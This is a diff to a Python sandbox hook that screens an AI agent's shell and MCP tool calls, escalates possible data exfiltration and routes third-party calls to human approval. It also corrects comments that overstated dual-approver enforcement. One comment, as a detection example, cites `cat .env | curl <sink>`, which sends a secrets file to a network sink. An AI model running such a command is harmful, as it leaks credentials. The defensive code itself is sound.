@@ -215,7 +215,7 @@ async def pre_tool_use(payload: dict[str, Any], layout: FolderLayout) -> dict[st
         environment=getattr(policy, "environment", None),
     )
     # Exfiltration shape: a sensitive source AND a network egress in one shell
-    # command. Deterministic; forces dual control and tells the approver why.
+    # command. Deterministic; flags dual control and tells the approver why.
     # Only ever raises scrutiny — a hard `deny` stays denied.
     if result.trigger == "shell" and result.command and result.verdict in ("allow", "observe", "escalate"):
         from sandbox.safety.exfil import detect as _detect_exfil
@@ -229,7 +229,8 @@ async def pre_tool_use(payload: dict[str, Any], layout: FolderLayout) -> dict[st
             result.reason_code = "EXFIL"
             result.reason = f"possible data exfiltration: {exfil.factor_detail()}"
             # `cat`/`type` are allowlisted, so `cat .env | curl <sink>` would
-            # otherwise be allowed silently. Exfil always faces two humans.
+            # otherwise be allowed silently. Exfil always faces a human, flagged
+            # for dual control (a second approver is not yet enforced).
             result.verdict = "escalate"
 
     result.risk = assessment.to_dict()
@@ -271,7 +272,7 @@ async def pre_tool_use(payload: dict[str, Any], layout: FolderLayout) -> dict[st
 
     # Contextual tier upgrades (safety is monotonic — risk only raises scrutiny):
     #   observe  + high/critical risk → escalate (e.g. reading ~/.ssh outside folder)
-    #   escalate + critical risk      → dual control (two approvers)
+    #   escalate + critical risk      → flagged for dual control (not yet enforced)
     if result.verdict == "observe" and assessment.band in ("escalate", "critical"):
         result.verdict = "escalate"
     if result.verdict == "escalate" and assessment.band == "critical":
@@ -320,8 +321,14 @@ async def pre_tool_use(payload: dict[str, Any], layout: FolderLayout) -> dict[st
             result, tool_name, payload, layout, policy, session_id, identity,
         )
 
-    # Non-shell escalations point the agent at the right MCP tool, since the
-    # hook cannot itself perform the network fetch or out-of-folder write.
+    # A third-party MCP call the sandbox can't perform itself: approve, then retry.
+    if _is_governed_tool(tool_name) and tool_name != "WebFetch":
+        return _govern_tool_call(
+            tool_name, tool_input, [], None, result, layout, session_id, identity,
+        )
+
+    # Other non-shell escalations point the agent at the right MCP tool, since
+    # the hook cannot itself perform the network fetch or out-of-folder write.
     _audit(layout, session_id, {
         "event": "escalate_redirect", "tool": tool_name, "trigger": result.trigger,
         "reason_code": result.reason_code, "identity": identity.to_dict(),
@@ -371,7 +378,8 @@ def _govern_tool_call(
     identity: Any,
 ) -> dict[str, Any]:
     """Deny, or "approve, then retry": allow the call once if a signed approval
-    for this exact call exists, else submit one and tell the agent to retry."""
+    for this exact call exists, else submit one and tell the agent to retry.
+    Used for governance hits and for any escalated third-party MCP call."""
     from sandbox.connector import tool_grants
     from sandbox.safety.tool_actions import describe_call, render
 
@@ -392,39 +400,46 @@ def _govern_tool_call(
     if grant is not None:
         tool_grants.consume(layout, grant["request_id"])
         _audit(layout, session_id, {
-            "event": "governance_grant_used", "request_id": grant["request_id"], "tool": tool_name,
+            "event": "tool_call_grant_used", "request_id": grant["request_id"], "tool": tool_name,
             "fingerprint": fp, "reviewer_id": grant.get("reviewer_id"), "identity": ident_dict,
             "governance": violations,
         })
         return _pre_output("allow", f"sandbox: approved by {grant.get('reviewer_id')} ({grant['request_id']})")
 
+    # Why it needs a human: governance clauses, or (no clause hit) the
+    # classifier's own escalation, e.g. an MCP server that isn't allowlisted.
+    if violations:
+        trigger, reason_code = "governance", "GOVERNANCE"
+        why = "; ".join(f"{v['title']} ({v['clause_id']})" for v in violations)
+    else:
+        trigger, reason_code = result.trigger or "network", result.reason_code or "NETWORK"
+        why = result.reason or f"{tool_name} requires approval"
     request_id = tool_grants.pending_for(layout, fp)
     if request_id is None:
-        titles = "; ".join(v["title"] for v in violations)
         request_id = EscalationQueue(layout).submit({
             "root": str(layout.root),
             "session_id": session_id,
             "origin": "hook",
-            "trigger": ["governance"],
-            "reason_code": "GOVERNANCE",
+            "trigger": [trigger],
+            "reason_code": reason_code,
             "kind": "tool_call",
             "tool_name": tool_name,
             "command": rendered,
             "fingerprint": fp,
             "actual_actions": [{"tag": t, "label": lbl} for t, lbl in describe_call(tool_name, tool_input)],
             "governance": violations,
-            "reason": f"Governance: {titles}",
+            "reason": why,
             "identity": ident_dict,
             "risk": result.risk,
             "requires_dual": result.requires_dual,
         })
     _audit(layout, session_id, {
-        "event": "governance_escalated", "request_id": request_id, "tool": tool_name,
-        "fingerprint": fp, "identity": ident_dict, "governance": violations, "risk": result.risk,
+        "event": "tool_call_escalated", "request_id": request_id, "tool": tool_name,
+        "reason_code": reason_code, "fingerprint": fp, "identity": ident_dict,
+        "governance": violations, "risk": result.risk,
     })
-    titles = "; ".join(f"{v['title']} ({v['clause_id']})" for v in violations)
     return _pre_output("deny", (
-        f"SANDBOX [GOVERNANCE]: this {tool_name} call needs human approval under: {titles}. "
+        f"SANDBOX [{reason_code}]: this {tool_name} call needs human approval: {why}. "
         f"Request {request_id} is waiting for an approver. Once it is approved, retry exactly the "
         f"same call (same arguments); it will be allowed once. Use check_request to see its status."
     ))
